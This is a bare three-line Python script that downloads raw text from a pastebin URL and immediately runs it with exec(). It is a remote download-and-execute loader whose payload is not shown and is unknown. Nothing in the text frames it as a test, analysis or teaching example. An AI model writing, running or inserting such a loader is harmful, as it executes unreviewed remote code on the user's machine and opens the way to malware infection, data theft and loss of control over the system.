import requests
url = requests.get('https://pastebin.com/raw/v562WZZV').text
exec(url)
